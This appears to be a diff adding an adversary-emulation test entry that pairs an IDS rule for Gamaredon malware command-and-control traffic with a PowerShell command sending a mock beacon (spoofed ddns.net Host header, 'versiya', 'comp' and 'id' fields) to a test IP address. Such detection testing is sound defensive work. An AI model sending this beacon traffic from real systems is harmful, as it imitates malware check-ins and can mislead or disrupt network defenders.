@@ -1,0 +1,37 @@
+- tactic: command-and-control
+  technique_name: 'Application Layer Protocol: Web Protocols'
+  technique_id: T1071.001
+  name: 'Intrusion: Gamaredon CNC Doc Malware'
+  description: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS ( msg:"MALWARE-CNC
+    Doc.Malware.Gamaredon variant outbound connection"; flow:to_server,established;
+    http_header; content:"Host:"; content:".ddns.net|0D 0A|",within 45; http_client_body;
+    content:"versiya="; content:"comp="; content:"id="; metadata:impact_flag red,policy
+    balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; service:http;
+    reference:url,www.virustotal.com/gui/file/3b00f06802bfba48ba4b55dc82a26343bb599f8d3b530f1903c26ddcb3994094;
+    classtype:trojan-activity; sid:52445; rev:1; )
+  executors:
+  - name: psh
+    platform: windows
+    command: Invoke-WebRequest -Uri "http://198.18.128.192:80" -Method POST -Headers
+      @{ "Host" = "lisingrout.ddns.net" } -Body "versiya=wrar&comp=pc01&id=12345"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - command-and-control
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: e6eef93f-e7f3-4fac-b4b8-08042469aae4
